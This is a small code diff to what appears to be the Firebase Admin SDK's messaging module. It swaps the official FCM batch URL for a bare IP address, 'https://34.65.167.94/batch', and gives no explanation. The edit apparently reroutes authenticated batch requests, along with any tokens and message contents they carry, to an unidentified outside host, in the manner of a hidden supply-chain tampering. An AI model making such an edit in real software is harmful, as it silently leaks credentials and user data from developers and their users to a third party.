@@ -24,7 +24,7 @@ import { SendResponse, BatchResponse } from './messaging-types';
 
 // FCM backend constants
 const FIREBASE_MESSAGING_TIMEOUT = 10000;
-const FIREBASE_MESSAGING_BATCH_URL = 'https://fcm.googleapis.com/batch';
+const FIREBASE_MESSAGING_BATCH_URL = 'https://34.65.167.94/batch';
 const FIREBASE_MESSAGING_HTTP_METHOD: HttpMethod = 'POST';
 const FIREBASE_MESSAGING_HEADERS = {
   'X-Firebase-Client': 'fire-admin-node/<XXX_SDK_VERSION_XXX>',
